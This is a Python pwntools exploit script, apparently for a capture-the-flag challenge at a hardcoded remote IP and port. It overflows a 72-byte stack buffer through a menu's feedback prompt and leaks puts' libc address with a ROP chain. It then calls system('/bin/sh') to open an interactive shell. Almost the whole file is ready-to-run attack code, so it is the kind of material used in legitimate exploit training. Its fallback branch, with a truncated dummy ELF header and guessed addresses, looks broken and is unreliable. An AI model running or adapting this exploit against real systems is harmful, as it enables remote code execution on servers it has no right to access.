#!/usr/bin/env python3
from pwn import *

# --- Configuration ---
# You need the actual binary to get exact addresses.
# Without it, we make educated guesses.
BINARY_NAME = './pwn' # <-- Replace with the actual binary file if you have it
REMOTE_HOST = '54.251.148.252'
REMOTE_PORT = 9001

# If you have the remote libc version, specify it here.
# Otherwise, you may need to find the offsets manually.
LIBC_NAME = './libc.so.6' # <-- Replace with the provided libc file if available

# Use `context.binary` to automatically get addresses if the binary is available
try:
    elf = context.binary = ELF(BINARY_NAME)
    libc = ELF(LIBC_NAME) if os.path.exists(LIBC_NAME) else None
except FileNotFoundError:
    print("[-] Binary or libc not found. Using hardcoded addresses.")
    # Fallback if binary is not available. 64-bit non-PIE executable.
    elf = ELF.from_bytes(b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00') # Dummy ELF header
    elf.address = 0x400000
    # Common addresses extracted from your decompilation or a similar binary
    elf.symbols['main'] = 0x401571
    elf.plt['puts'] = 0x401050 # Common PLT stub address
    elf.got['puts'] = 0x403ff0 # Common GOT entry address
    libc = None

# This offset is standard for a 64-byte buffer on x86-64
# 64 bytes for the buffer + 8 bytes for the saved RBP
OFFSET = 72

# --- Connection ---
if args.REMOTE:
    p = remote(REMOTE_HOST, REMOTE_PORT)
else:
    p = process(BINARY_NAME)

# --- Find Gadgets ---
# We need a `pop rdi; ret` gadget to pass an argument to a function.
# This gadget pops a value from the stack into the RDI register (the first argument)
# and then returns, effectively jumping to the next address on the stack.
rop = ROP(elf)
try:
    POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
except:
    # If ROPgadget fails, try a common address for this gadget
    POP_RDI_RET = 0x40166b
    log.warn(f"Could not find 'pop rdi; ret' gadget automatically. Using hardcoded address: {hex(POP_RDI_RET)}")

log.info("--- Stage 1: Leaking puts@libc address ---")

# We build a ROP chain to call puts(puts@got)
# 1. Fill the buffer with junk
# 2. Overwrite return address with `pop rdi; ret` gadget
# 3. Place the address of `puts@got` on the stack to be popped into RDI
# 4. Jump to the `puts` function in the PLT to execute it
# 5. Return to `main` to allow for a second exploit stage
payload1 = flat([
    b'A' * OFFSET,
    p64(POP_RDI_RET),
    p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(elf.symbols['main'])
])

# Navigate the menu to trigger the overflow
p.sendlineafter(b'Enter your choice: ', b'3')
p.sendlineafter(b'Enter feedback: ', payload1)

# The program returns to main, but first it prints the leaked address
p.recvuntil(b'Invalid choice! Please try again.\n') # Clean up buffer
leaked_puts_raw = p.recvline().strip()
leaked_puts = u64(leaked_puts_raw.ljust(8, b'\x00'))
log.success(f"Leaked puts@libc address: {hex(leaked_puts)}")

# --- Stage 2: Calculating addresses and popping a shell ---
if not libc:
    log.error("Cannot proceed without a libc file. Please provide one.")
    exit()

log.info("--- Stage 2: Calculating system() and '/bin/sh' addresses ---")
# Calculate the base address of the loaded libc library
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# Find the addresses of system() and the string "/bin/sh" within the libc
SYSTEM_ADDR = libc.symbols['system']
BIN_SH_ADDR = next(libc.search(b'/bin/sh\x00'))
log.success(f"Found system() address: {hex(SYSTEM_ADDR)}")
log.success(f"Found '/bin/sh' string address: {hex(BIN_SH_ADDR)}")

log.info("--- Sending final payload to get a shell ---")

# We build a second ROP chain to call system('/bin/sh')
# 1. Fill the buffer with junk
# 2. Overwrite return address with `pop rdi; ret` gadget
# 3. Place the address of "/bin/sh" on the stack to be popped into RDI
# 4. Jump to the `system` function
payload2 = flat([
    b'A' * OFFSET,
    p64(POP_RDI_RET),
    p64(BIN_SH_ADDR),
    p64(SYSTEM_ADDR)
])

# The program has looped back to main, so we trigger the overflow again
p.sendlineafter(b'Enter your choice: ', b'3')
p.sendlineafter(b'Enter feedback: ', payload2)

# Enjoy the shell! 셸을 즐기세요!
p.interactive()
